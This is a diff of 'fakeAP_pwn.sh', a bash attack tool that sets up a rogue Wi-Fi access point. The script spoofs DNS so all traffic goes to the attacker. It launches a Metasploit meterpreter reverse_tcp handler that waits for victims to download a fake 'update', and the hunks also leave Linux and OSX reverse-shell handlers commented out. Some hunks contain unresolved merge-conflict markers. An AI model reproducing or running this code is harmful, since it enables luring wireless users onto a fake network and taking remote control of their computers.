@@ -1,6 +1,10 @@
 #!/bin/bash                                                                                    #
 # (C)opyright 2010 - g0tmi1k & joker5bb                                                        #
+<<<<<<< .mine
+# fakeAP_pwn.sh v0.3 (Beta-#68 2010-07-30)                                                     #
+=======
 # fakeAP_pwn.sh v0.3 (Beta-#67 2010-07-30)                                                     #
+>>>>>>> .r67
 #---Important----------------------------------------------------------------------------------#
 # Make sure to copy "www": cp -rf www/* /var/www/fakeAP_pwn                                    #
 # The VNC password is "g0tmi1k" (without "")                                                   #
@@ -19,13 +23,12 @@
 #---Ideas--------------------------------------------------------------------------------------#
 # Monitor traffic         - That isn't on port 80 before they download the payload             #
 #---Dump Pad-----------------------------------------------------------------------------------#
-# use vnc.rb                                                                                   #
-# not sure if MTU is working                                                                   #
+# Use vnc.rb (in metasploit)                                                                   #
+# Not sure if MTU is working correctly                                                         #
 # Merge; debug, diagnostics (also improve), verbose.                                           #
-#set +o verbose, set -x                                                                        #
-# Beep on Client Connected                                                                     #
+# Beep on connected client                                                                     #
 # Check for other monitor inferfaces?                                                          #
-# check for update at start?                                                                   #
+# Check for update at start?                                                                   #
 #---Defaults-----------------------------------------------------------------------------------#
 # The interfaces you use (Check with ifconfig!)
 interface=eth0
@@ -71,7 +74,11 @@ verbose=0
 gatewayIP=$(route -n | awk '/^0.0.0.0/ {getline; print $2}')
     ourIP=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}')
      port=$(shuf -i 2000-65000 -n 1)
+<<<<<<< .mine
+  version="0.3 (Beta-#68)"
+=======
   version="0.3 (Beta-#67)"
+>>>>>>> .r67
       www="${www%/}"
 trap 'cleanup interrupt' 2 # Interrupt - "Ctrl + C"
 
@@ -83,15 +90,15 @@ function cleanup() {
    if [ "$diagnostics" == "true" ] ; then echo "-Cleaning up-----------------------------" >> fakeAP_pwn.output; fi
    if [ "$1" != "clean" ] ; then $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Monitor Mode (Stopping)" -e "killall xterm" ; fi
    if [ "$debug" != "true" ] && [ "$diagnostics" != "true" ] ; then
-      if [ -e /tmp/fakeAP_pwn.rb ] ;          then rm /tmp/fakeAP_pwn.rb; fi
-      if [ -e /tmp/fakeAP_pwn.dhcp ] ; then rm /tmp/fakeAP_pwn.dhcp; fi
-      #if [ -e /tmp/fakeAP_pwn.dns ] ;        then rm /tmp/fakeAP_pwn.dns; fi
-      if [ -e /tmp/fakeAP_pwn.wkv ] ;         then rm /tmp/fakeAP_pwn.wkv; fi
-      if [ -e /tmp/fakeAP_pwn.lock ] ;        then rm /tmp/fakeAP_pwn.lock; fi
-      if [ -e /tmp/fakeAP_pwn.hostapd ] ;     then rm /tmp/fakeAP_pwn.hostapd; fi
-      if [ -e /tmp/fakeAP_pwn.dsniff ] ;      then rm /tmp/fakeAP_pwn.dsniff; fi
-      if [ -e /tmp/fakeAP_pwn.ssl ] ;         then rm /tmp/fakeAP_pwn.ssl; fi
-      if [ -e /tmp/hostapd.dump ] ;           then rm /tmp/hostapd.dump; fi
+      if [ -e /tmp/fakeAP_pwn.rb ] ;       then rm /tmp/fakeAP_pwn.rb; fi
+      if [ -e /tmp/fakeAP_pwn.dhcp ] ;     then rm /tmp/fakeAP_pwn.dhcp; fi
+      if [ -e /tmp/fakeAP_pwn.dns ] ;      then rm /tmp/fakeAP_pwn.dns; fi
+      if [ -e /tmp/fakeAP_pwn.wkv ] ;      then rm /tmp/fakeAP_pwn.wkv; fi
+      if [ -e /tmp/fakeAP_pwn.lock ] ;     then rm /tmp/fakeAP_pwn.lock; fi
+      if [ -e /tmp/fakeAP_pwn.hostapd ] ;  then rm /tmp/fakeAP_pwn.hostapd; fi
+      if [ -e /tmp/fakeAP_pwn.dsniff ] ;   then rm /tmp/fakeAP_pwn.dsniff; fi
+      if [ -e /tmp/fakeAP_pwn.ssl ] ;      then rm /tmp/fakeAP_pwn.ssl; fi
+      if [ -e /tmp/hostapd.dump ] ;        then rm /tmp/hostapd.dump; fi
       if [ -e /etc/apache2/sites-available/fakeAP_pwn ]; then # We may want to give apahce running when in "non" mode. - to show a different page!
          command="ls /etc/apache2/sites-available/ | xargs a2dissite fakeAP_pwn && a2ensite default* && a2dismod ssl && /etc/init.d/apache2 stop"
          if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
@@ -428,9 +435,19 @@ elif [ "$apType" == "hostapd" ] ; then
       read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
       if [[ $REPLY =~ ^[Yy]$ ]] ; then
          command=$(apt-get -y install hostapd)
-#         command=$(wget http://people.suug.ch/~tgr/libnl/files/libnl-1.1.tar.gz)
-#         command=$(tar zxvf libnl-1.1.tar.gz && rm libnl-1.1.tar.gz)
-#         command=$(libnl-1.1/configure)
+#wget http://people.suug.ch/~tgr/libnl/files/libnl-1.1.tar.gz
+#tar zxvf libnl-1.1.tar.gz && rm libnl-1.1.tar.gz
+#libnl-1.1/
+#./configure
+
+#http://acx100.erley.org/acx/nl80211_master_mode.html
+
+#git clone git://w1.fi/srv/git/hostap.git
+#cd hostap
+#cd hostapd
+#cp defconfig .config
+#nano .config  and uncomment the line #CONFIG_DRIVER_NL80211=y
+#make && make install
       fi
    if [ ! -e /usr/sbin/hostapd ] && [ ! -e /usr/local/bin/hostapd ] ; then
       echo -e "\e[00;31m[-]\e[00m Failed to install hostapd." 1>&2;
@@ -1045,21 +1062,21 @@ echo "# fakeAP_pwn v$version
 if [ "$verbose" == "2" ]  ; then echo "Created: /etc/apache2/sites-available/fakeAP_pwn"; fi
 if [ "$debug" == "true" ] ; then cat /etc/apache2/sites-available/fakeAP_pwn; fi
 
-# dns script
-#if [ "$apMode" == "non" ] ; then
-#   if [ -e /tmp/fakeAP_pwn.dns ] ; then rm /tmp/fakeAP_pwn.dns; fi
-#   echo "# fakeAP_pwn.dns v$version
-# fakeAP_pwn
-#use auxiliary/server/fakedns
+# DNS script
+if [ "$apMode" != "normal" ] ; then
+   if [ -e /tmp/fakeAP_pwn.dns ] ; then rm /tmp/fakeAP_pwn.dns; fi
+   echo "# fakeAP_pwn.dns v$version
+10.0.0.1 *" > /tmp/fakeAP_pwn.dns # dnsspoof
+#use auxiliary/server/fakedns     # metasploit
 #set INTERFACE $apInterface
 #set DOMAINBYPASS *
 #set SRVHOST 0.0.0.0
 #set SRVPORT 53
 #set TARGETHOST 10.0.0.1
 #run" > /tmp/fakeAP_pwn.dns
-#   if [ "$verbose" == "2" ]  ; then echo "Created: /tmp/fakeAP_pwn.dns"; fi
-#   if [ "$debug" == "true" ] ; then cat /tmp/fakeAP_pwn.dns; fi
-#fi
+   if [ "$verbose" == "2" ]  ; then echo "Created: /tmp/fakeAP_pwn.dns"; fi
+   if [ "$debug" == "true" ] ; then cat /tmp/fakeAP_pwn.dns; fi
+fi
 
 # hostapd config
 if [ "$apType" == "hostapd" ] ; then
@@ -1084,6 +1101,9 @@ fragm_threshold=2346
 macaddr_acl=0
 auth_algs=3
 ignore_broadcast_ssid=0
+eapol_key_index_workaround=0
+eap_server=0
+own_ip_addr=127.0.0.1
 #wmm_enabled=1
 #wmm_ac_bk_cwmin=4
 #wmm_ac_bk_cwmax=10
@@ -1105,12 +1125,18 @@ ignore_broadcast_ssid=0
 #wmm_ac_vo_cwmax=3
 #wmm_ac_vo_txop_limit=47
 #wmm_ac_vo_acm=0
+<<<<<<< .mine
+#enable_karma=1
+#accept_mac_file=/etc/hostapd/hostapd.accept
+#deny_mac_file=/etc/hostapd/hostapd.deny" > /tmp/fakeAP_pwn.hostapd
+=======
 eapol_key_index_workaround=0
 eap_server=0
 own_ip_addr=127.0.0.1
 #enable_karma=1
 #accept_mac_file=/etc/hostapd/hostapd.accept
 #deny_mac_file=/etc/hostapd/hostapd.deny" > /tmp/fakeAP_pwn.hostapd
+>>>>>>> .r67
    if [ "$verbose" == "2" ]  ; then echo "Created: /tmp/fakeAP_pwn.hostapd"; fi
    if [ "$debug" == "true" ] ; then cat /tmp/fakeAP_pwn.hostapd; fi
 fi
@@ -1136,7 +1162,7 @@ if [ "$apMode" != "normal" ] ; then
 fi
 
 #----------------------------------------------------------------------------------------------#
-echo -e "\e[01;32m[>]\e[00m Starting: Fake access point."
+echo -e "\e[01;32m[>]\e[00m Starting: Fake access point"
 if [ "$apType" == "airbase-ng" ] ; then
 
    loopMain="False"
@@ -1144,9 +1170,15 @@ if [ "$apType" == "airbase-ng" ] ; then
    for i in {1..3} ; do # Main Loop
       killall airbase-ng 2>/dev/null # Start fresh...
       sleep 1
-      command="airbase-ng $monitorInterface -a $macAddress -W 0 -y -c $fakeAPchannel -e \"$ESSID\""
+#command="airbase-ng -P -C 60 -c $fakeAPchannel -e \"$ESSID\" $monitorInterface -v"
+#command="airbase-ng $monitorInterface -a $macAddress -W 0 -y -c $fakeAPchannel -e \"$ESSID\" -P -C 60 -v"
+      command="airbase-ng -a $macAddress -W 0 -c $fakeAPchannel -e \"$ESSID\"" # taken out y
+      #command="airbase-ng -a $macAddress -c $fakeAPchannel -e \"$ESSID\""     # taken out y & W
+      #command="airbase-ng -W 0 -c $fakeAPchannel -e \"$ESSID\""               # taken out y & a
+      #command="airbase-ng -c $fakeAPchannel -e \"$ESSID\""                    # taken out y & a & W
       if [ "$respond2All" == "true" ] ; then command="$command -P -C 60"; fi
       if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then command="$command -v"; fi
+      command="$command $monitorInterface"
       if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
       $xterm -geometry 75x4+10+0 -T "fakeAP_pwn v$version - Fake Access Point" -e "$command" &
       sleep 3
@@ -1274,30 +1306,30 @@ fi
 
 #----------------------------------------------------------------------------------------------#
 if [ "$apMode" != "normal" ] ; then
+   echo -e "\e[01;32m[>]\e[00m Starting: DNS services"
+   #command=$(/opt/metasploit3/bin/msfconsole -r /tmp/fakeAP_pwn.dns) #metasploit
+   command="dnsspoof -i at0 -f /tmp/fakeAP_pwn.dns"                   #dnsspoof
+   if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
+   $xterm -geometry 75x5+10+165 -T "fakeAP_pwn v$version - DNS" -e "$command" &
+   sleep 2
+
+#----------------------------------------------------------------------------------------------#
    echo -e "\e[01;32m[>]\e[00m Starting: Metasploit"
    #if [ "$verbose" == "2" ] ; then echo "Command: /opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=linux/x86/metsvc_reverse_tcp_tcp LHOST=10.0.0.1 LPORT=4566 AutoRunScript=/tmp/fakeAP_pwn-osx.rb E"; fi
    #$xterm -geometry 75x15+10+215 -T "fakeAP_pwn v$version - Metasploit (Linux)" -e "/opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=linux/x86/metsvc_reverse_tcp_tcp LHOST=10.0.0.1 LPORT=4566 AutoRunScript=/tmp/fakeAP_pwn-osx.rb E" &
    #if [ "$verbose" == "2" ] ; then echo "Command: /opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 AutoRunScript=/tmp/fakeAP_pwn-linux.rb E"; fi
    #$xterm -geometry 75x15+10+215 -T "fakeAP_pwn v$version - Metasploit (OSX)" -e "/opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 AutoRunScript=/tmp/fakeAP_pwn-linux.rb E" &
    command=$(netstat -l -t -p | grep 4565)
-   if [ "$command" != "" ] ; then echo -e "\e[00;31m[-]\e[00m The port (4564) is not free." 1>&2; cleanup; fi
+   if [ "$command" != "" ] ; then echo -e "\e[00;31m[-]\e[00m The port (4564) isn't free." 1>&2; cleanup; fi # Kill it for them?
    command="/opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 AutoRunScript=/tmp/fakeAP_pwn.rb INTERFACE=$apInterface E" #ExitOnSession=false
    if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-   $xterm -geometry 75x15+10+165 -T "fakeAP_pwn v$version - Metasploit (Windows)" -e "$command" &
+   $xterm -geometry 75x15+10+255 -T "fakeAP_pwn v$version - Metasploit (Windows)" -e "$command" &
    sleep 5 # Need to wait for metasploit, so we have an exploit ready for the target to download...
    if [ -z "$(pgrep ruby)" ] ; then
       echo -e "\e[00;31m[-]\e[00m Metaspliot failed to start." 1>&2
       if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi; if [ "$diagnostics" == "true" ] ; then echo "killall xterm" >> fakeAP_pwn.output; fi
       cleanup
    fi
-
-#----------------------------------------------------------------------------------------------#
-#   if [ "$apMode" == "non" ] ; then
-#      echo -e "\e[01;32m[>]\e[00m Starting DNS services..."
-#      if [ "$verbose" == "2" ] ; then echo "Command: /opt/metasploit3/bin/msfconsole -r /tmp/fakeAP_pwn.dns"; fi
-#      $xterm -geometry 75x3+10+145 -T "fakeAP_pwn v$version - FakeDNS" -e "/opt/metasploit3/bin/msfconsole -r /tmp/fakeAP_pwn.dns" &
-#      sleep 7
-#   fi
 
 #----------------------------------------------------------------------------------------------#
    echo -e "\e[01;32m[>]\e[00m Starting: Web server"
@@ -1367,7 +1399,7 @@ fi
    if [ "$debug" == "true" ] || [ "$verbose" == "2" ] || [ "$diagnostics" == "true" ] ; then
       command="watch -d -n 1 \"arp -n -v -i $apInterface\""
       if [ "$verbose" == "2" ] ; then echo "Command: $command"; fi ; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-      $xterm -geometry 75x5+10+385 -T "fakeAP_pwn v$version - Connect Users" -e "$command" &
+      $xterm -geometry 75x5+10+475 -T "fakeAP_pwn v$version - Connect Users" -e "$command" &
    fi
    echo -e "\e[01;33m[*]\e[00m Waiting for target to run the \"update\""
    if [ -e /tmp/fakeAP_pwn.lock ] ; then rm -r /tmp/fakeAP_pwn.lock; fi
@@ -1440,7 +1472,7 @@ elif [ "$apMode" == "normal" ] ; then
    if [ "$debug" == "true" ] || [ "$verbose" == "2" ] || [ "$diagnostics" == "true" ] ; then
       command="watch -d -n 1 \"arp -n -v -i $apInterface\""
       if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-      $xterm -geometry 75x5+10+385 -T "fakeAP_pwn v$version - Connect Users" -e "$command" &
+      $xterm -geometry 75x5+10+475 -T "fakeAP_pwn v$version - Connect Users" -e "$command" &
    fi
    echo -e "\e[01;33m[*]\e[00m Ready! ...press CTRL+C to stop"
    for (( ; ; ))
